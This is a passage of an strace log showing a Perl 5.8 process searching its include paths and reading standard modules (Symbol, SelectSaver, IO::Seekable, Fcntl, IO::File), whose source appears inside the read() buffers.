4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
9764  07:29:45.366006 stat64("/etc/perl/Symbol.pmc",  <unfinished ...>
9762  07:29:45.366025 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9762  07:29:45.366047 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9762  07:29:45.366061 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9762  07:29:45.366072 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9762  07:29:45.366084 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
9762  07:29:45.366098 waitpid(-1,  <unfinished ...>
9764  07:29:45.366108 <... stat64 resumed> 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.366116 stat64("/etc/perl/Symbol.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.366130 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.366142 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.366156 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.366168 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.366182 stat64("/usr/lib/perl5/Symbol.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.366193 stat64("/usr/lib/perl5/Symbol.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.366207 stat64("/usr/share/perl5/Symbol.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.366224 stat64("/usr/share/perl5/Symbol.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.366238 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.366250 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.366263 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.366276 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
9764  07:29:45.366296 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
9764  07:29:45.366311 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2d68) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.366332 _llseek(8, 0, [0], SEEK_CUR) = 0
9764  07:29:45.366380 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
9764  07:29:45.366778 read(8, "", 4096) = 0
9764  07:29:45.366794 close(8)          = 0
9764  07:29:45.366930 stat64("/etc/perl/SelectSaver.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.366965 stat64("/etc/perl/SelectSaver.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.366979 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.366992 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.367006 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.367019 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.367033 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.367045 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.367063 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.367075 stat64("/usr/share/perl5/SelectSaver.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.367088 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.367101 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.367115 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.367128 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
9764  07:29:45.367149 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
9764  07:29:45.367164 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2d68) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.367175 _llseek(8, 0, [0], SEEK_CUR) = 0
9764  07:29:45.367194 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
9764  07:29:45.367331 brk(0x81d6000)    = 0x81d6000
9764  07:29:45.367409 read(8, "", 4096) = 0
9764  07:29:45.367422 close(8)          = 0
9764  07:29:45.367889 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
9764  07:29:45.368764 read(6, "", 4096) = 0
9764  07:29:45.368781 close(6)          = 0
9764  07:29:45.368908 stat64("/etc/perl/IO/Seekable.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.378360 stat64("/etc/perl/IO/Seekable.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.378394 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.378425 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.378439 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.378452 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.378466 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.378478 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.378491 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.378504 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.378517 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.378530 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
9764  07:29:45.378552 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
9764  07:29:45.378567 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa3218) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.378578 _llseek(6, 0, [0], SEEK_CUR) = 0
9764  07:29:45.378598 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
9764  07:29:45.378728 stat64("/etc/perl/Fcntl.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.378744 stat64("/etc/perl/Fcntl.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.378757 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.378774 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.378788 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.378800 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.378852 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.378865 stat64("/usr/lib/perl5/Fcntl.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.378879 stat64("/usr/share/perl5/Fcntl.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.378907 stat64("/usr/share/perl5/Fcntl.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.378920 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.378932 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
9764  07:29:45.378953 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
9764  07:29:45.378967 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2d68) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.378978 _llseek(8, 0, [0], SEEK_CUR) = 0
9764  07:29:45.378997 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
9764  07:29:45.379374 brk(0x81f7000)    = 0x81f7000
9764  07:29:45.379568 read(8, "", 4096) = 0
9764  07:29:45.379582 close(8)          = 0
9764  07:29:45.379652 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
9764  07:29:45.379677 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
9764  07:29:45.379704 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
9764  07:29:45.379718 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
9764  07:29:45.379824 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
9764  07:29:45.379861 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7da7000
9764  07:29:45.379875 mmap2(0xb7daa000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7daa000
9764  07:29:45.379891 close(8)          = 0
9764  07:29:45.380094 read(6, "", 4096) = 0
9764  07:29:45.380108 close(6)          = 0
9764  07:29:45.380141 stat64("/etc/perl/IO/File.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.380155 stat64("/etc/perl/IO/File.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380169 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.380182 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380196 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.380208 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380222 stat64("/usr/lib/perl5/IO/File.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.380233 stat64("/usr/lib/perl5/IO/File.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380247 stat64("/usr/share/perl5/IO/File.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.380262 stat64("/usr/share/perl5/IO/File.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.380289 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.380327 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
9764  07:29:45.380366 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
9764  07:29:45.380380 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa3218) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.380392 _llseek(6, 0, [0], SEEK_CUR) = 0
9764  07:29:45.380409 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode 